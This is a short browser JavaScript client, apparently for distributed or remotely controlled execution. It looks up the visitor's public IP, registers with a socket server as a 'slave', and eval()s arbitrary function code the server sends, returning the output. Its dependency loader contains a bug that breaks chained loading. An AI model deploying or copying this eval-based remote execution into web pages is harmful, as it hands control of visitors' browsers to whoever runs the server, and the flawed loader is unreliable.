let loaded = [];

function loadScript(url, integrity, callback) {
	// Adding the script tag to the head as suggested before
	let head = document.getElementsByTagName("head")[0];
	let script = document.createElement("script");

	script.type = "application/javascript";
	script.src = url;

	if (integrity != null) {
		script.integrity = integrity;
		script.crossorigin = "anonymous";
	}

	// Then bind the event to the callback function.
	// There are several events for cross browser compatibility.
	if (callback != null) {
		script.onreadystatechange = callback;
		script.onload = callback;
	}

	loaded.push(url);

	// Fire the loading
	head.appendChild(script);
}

function loadRemoteFunctionDeps(remoteFunction, callback, ii) {
	if (remoteFunction.deps.length != 0) {
		let i = ii || 0;
		if (!loaded.includes(remoteFunction.deps[i].url)) {
			loadScript(
				remoteFunction.deps[i].url,
				remoteFunction.deps[i].integrity,
				i == remoteFunction.deps.length - 1 ? callback : loadRemoteFunctionDeps,
				[remoteFunction, callback, i + 1]
			);
		}
	} else {
		callback();
		return;
	}
}

function request(url, method, body, callback) {
    let xhr = new XMLHttpRequest();
    xhr.open(method, url, true);
    xhr.send(body);

    xhr.onreadystatechange = function(e) {
        if (xhr.readyState == 4 && xhr.status == 200) {
            if (callback) callback(xhr.responseText);
        }
    }
}

// Script loading
loadScript("https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.0/socket.io.js", null, function () {
	request("//ident.me", "GET", "", function(data) {
		client(data);
	});
});

// Actual code starts here
function client(ip) {
	const nodeJsIp = window.nodeJsIp || "/";
	const socketConf = {
		transports: ["websocket"]
	}

	let socket = nodeJsIp ? io(nodeJsIp, socketConf) : io("ws" + window.location.href.substring(4), socketConf);

	socket.on("connect", function () {
		socket.emit("postConnection", "slave", ip);

		socket.on("executeRemoteFunction", function (remoteFunction, debug, funcName) {
			loadRemoteFunctionDeps(remoteFunction, function () {

				let remoteFunctionOut = eval("(" + remoteFunction.func + ")(remoteFunction.args, debug)");
				socket.emit(funcName + "Out", remoteFunctionOut);

			});
		});

	});
	// on reconnection, reset the transports option, as the Websocket
	// connection may have failed (caused by proxy, firewall, browser, ...)
	socket.on("reconnect_attempt", () => {
		socket.io.opts.transports = ["polling", "websocket"];
	});
}
